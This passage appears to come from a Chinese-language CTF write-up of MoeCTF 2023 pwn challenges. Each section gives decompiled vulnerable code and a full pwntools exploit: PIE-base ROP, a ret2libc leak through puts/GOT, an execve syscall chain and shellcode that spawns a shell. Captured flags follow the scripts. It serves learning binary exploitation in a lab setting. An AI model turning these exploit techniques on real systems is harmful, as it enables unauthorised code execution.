    <span class="token keyword">return</span> segment<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> segment<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> segment<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> segment<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>

decoded_str_big_endian <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>convert<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> flag <span class="token keyword">in</span> flag <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>decoded_str_big_endian<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;aYPLLDcBgrrWnH3EpAPKHQ1Ox1Gwd7WQ&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><p>查询了一下PIE是一种程序每次运行时候都能加载到不同内存地址的技术，每次加载整个程序中的代码数据和堆栈都会随机化</p>
<p>然后这里把vuln函数的地址打印了出来，查询资料后发现，pie是基地址会变，但是偏移地址是不变的，可以用这里打印的vuln的地址计算出基地址然后用偏移地址来确定数据和函数的位置</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time i will give u a gift!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Vuln's address is:%p\n"</span><span class="token punctuation">,</span> vuln<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>具体怎么操作我是看这篇文章学会的<br><a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit">https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit</a> </p>
<p>首先需要将context.binary 设置成 ELF(.&#x2F;pwn)</p>
<p>elf.address &#x3D; vuln - elf.sym[‘vuln’] 这里根据elf的符号表的偏移 算出基地址</p>
<p>下面payload中gadget只需要加上elf.address 这个基地址就可以了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment">#</span>
ip <span class="token operator">=</span> <span class="token string">"192.168.1.129"</span>
port <span class="token operator">=</span> <span class="token number">57376</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"This time i will give u a gift!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># This time i will give u a gift!\n</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Vuln's address is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Vuln's address is:%p\n</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>

vuln <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
elf<span class="token punctuation">.</span>address <span class="token operator">=</span> vuln <span class="token operator">-</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># offset = buf[80] + 8(byte) = r</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00101a</span><span class="token punctuation">)</span> <span class="token comment"># ret_address</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x001323</span><span class="token punctuation">)</span> <span class="token comment"># gadget_address pop rdi ; ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x004010</span><span class="token punctuation">)</span> <span class="token comment"># /bin/sh address</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;3N3evVehPhOpH9nNLAd6KmD_Z8jhY36t&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I hide the b4ckdoor..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"But..maybe libc can help u??\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据题目意思还有程序逻辑，system函数被移除了，所以要到libc里面找</p>
<p>linux每次加载程序的时候libc的基地址都会改变，但是libc内的偏移是不变的，想要调用system这个函数，首先要泄露libc的基地址，然后根据偏移地址去拿到system，这时候可以构造一个这样的调用链puts_plt(puts_got) 把got表中的puts的位置打印出来， 然后用 puts_got 减去libc中基地址与puts的偏移关系，就能拿到libc的基地址，这时候我们需要再回到vuln function里面，再read一遍，用之前的libc_base + system偏移 以及 libc_base + bin&#x2F;sh的偏移 把shell拿到</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>

ip <span class="token operator">=</span> <span class="token string">"192.168.1.111"</span>
port <span class="token operator">=</span> <span class="token number">63227</span>

<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>


line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"I hide the b4ckdoor..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"But..maybe libc can help u??\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>



puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment"># got 表中的 puts地址</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment"># plt</span>
gadget_address <span class="token operator">=</span> <span class="token number">0x40117e</span>  <span class="token comment"># pop rdi; ret</span>

payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># offset r</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget_address<span class="token punctuation">)</span>  <span class="token comment"># pop rdi; ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>  <span class="token comment"># puts_plt(put_gots)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>  <span class="token comment"># puts(put_gots) 打印put_got的地址</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4011E8</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># 接收泄露的地址</span>
leaked_puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Leaked puts address: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leaked_puts<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 计算libc的基址</span>
put_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
libc_base <span class="token operator">=</span> leaked_puts <span class="token operator">-</span> put_offset
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Libc base address: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>


<span class="token comment">###################################################################################</span>
<span class="token comment"># 重新回到vuln 然后再read一遍，有了libc的基址 就能根据偏移拿到system /bin/sh</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"I hide the b4ckdoor..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"But..maybe libc can help u??\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>
line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>


system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token comment">#system实际地址</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># /bin/sh 实际地址</span>
ret_address <span class="token operator">=</span> <span class="token number">0x40101a</span> <span class="token comment"># ret</span>
gadget_address <span class="token operator">=</span> <span class="token number">0x40117e</span> <span class="token comment"># pop rdi ret</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># offset r</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span> <span class="token comment"># ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget_address<span class="token punctuation">)</span> <span class="token comment"># pop rdi ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;zqCYX9rID5N8EvdK6cRpjzxGiKua-j6-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>64位 syscall会根据rax的值去调用系统，其中有个execve的函数能够执行shell命令，编号是59。</p>
<p>用法是先设置rax的值为59来选择execve这个函数</p>
<p>然后设置rdi rsi rdx 三个寄存器传递&#x2F;bin&#x2F; sh null null三个参数过去</p>
<p>最后syscall就好了</p>
<p>32位和64位不同的是传参的调用约定和编号</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/iszq8p">https://www.yuque.com/cyberangel/rg9gdm/iszq8p</a></p>
<p><a target="_blank" rel="noopener" href="https://publicki.top/old/syscall.html#x86_64-64_bit">https://publicki.top/old/syscall.html#x86_64-64_bit</a> </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2syscall'</span><span class="token punctuation">)</span>

ip <span class="token operator">=</span> <span class="token string">"192.168.129.194"</span>
port <span class="token operator">=</span> <span class="token number">57614</span>

<span class="token comment"># p = process()</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span> <span class="token comment">#</span>

line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># Can you make a syscall?</span>

syscall_addr <span class="token operator">=</span> <span class="token number">0x401185</span>
pop_rax_ret <span class="token operator">=</span> <span class="token number">0x40117e</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x401180</span>
pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x401182</span>
pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x401183</span>
pop_rsi_rdx_ret <span class="token operator">=</span> <span class="token number">0x401182</span>
binsh <span class="token operator">=</span> <span class="token number">0x404040</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>
        <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># offset r</span>
        pop_rax_ret<span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token comment"># execve("/bin/sh" , NULL , NULL)</span>
        pop_rdi_ret<span class="token punctuation">,</span> binsh <span class="token punctuation">,</span>
        pop_rsi_rdx_ret <span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span>
        syscall_addr
    <span class="token punctuation">]</span>
<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;3e8lLsjSF62Ebm55dV_11iZHHp7TFVUZ&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h2><p>这里如果输入数据的第一个字节不为0的话，test al al 会将zf寄存器设置成1，然后会jz初始化我输入的数据，所以只需要保证第一个字节是0x00就好了</p>
<pre class="line-numbers language-none"><code class="language-none">lea     rax, [rbp+s]
movzx   eax, byte ptr [rax]
test    al, al
jz      short loc_125D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">lea     rax, [rbp+s]
mov     edx, 64h ; &#39;d&#39;  ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">loc_125D:
lea     rax, [rbp+s]
add     rax, 1
mov     [rbp+var_78], rax
mov     rdx, [rbp+var_78]
mov     eax, 0
call    rdx
mov     eax, 0
mov     rdx, [rbp+var_8]
sub     rdx, fs:28h
jz      short locret_128D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

ip <span class="token operator">=</span> <span class="token string">"192.168.129.194"</span>
port <span class="token operator">=</span> <span class="token number">63480</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
<span class="token comment"># p = process("./shellcode_level2")</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> shellcode
payload <span class="token operator">=</span> shellcode <span class="token comment"># #</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;5WxAPxrGkQOTgaLi3fXkBZV8IKQEDBPF&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="uninitialized-key-plus"><a href="#uninitialized-key-plus" class="headerlink" title="uninitialized_key_plus"></a>uninitialized_key_plus</h2><p>和uninitialized_key类似，区别在get_name函数那是scanf %24s，然后位置有些不太一样ida里面看内存布局算一下就好了</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *

ip &#x3D; &quot;192.168.129.194&quot;
port &#x3D; 49771
p &#x3D; remote(ip, port)
# p &#x3D; process(&quot;.&#x2F;uninitialized_key_plus&quot;)

line &#x3D; p.recvline(); print(line) # Welcome to Moectf 2023.
line &#x3D; p.recvline(); print(line) # Do you know stack?
line &#x3D; p.recvline(); print(line) # Please input your name:

payload &#x3D; b&#39;A&#39; * 20
payload +&#x3D; p32(114514) # 转四字节
p.sendline(payload)

line &#x3D; p.recvline(); print(line) # Your name is %s.\n
line &#x3D; p.recvline(); print(line) # Please input your key:

p.sendline(b&#39;&#x3D;&#39;)

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">moectf&#123;HEPwrkfbVLeO2t_8ea0K6PipJiGm2DQP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="format-level1-补"><a href="#format-level1-补" class="headerlink" title="format_level1[补]"></a>format_level1[补]</h2><p>格式化字符串修改 dragon.HP 就好了，修改pwner的atk 字符串会长一些，输入长度不够</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./format_level1'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.1.101"</span>
    port <span class="token operator">=</span> <span class="token number">54822</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>



sl<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>

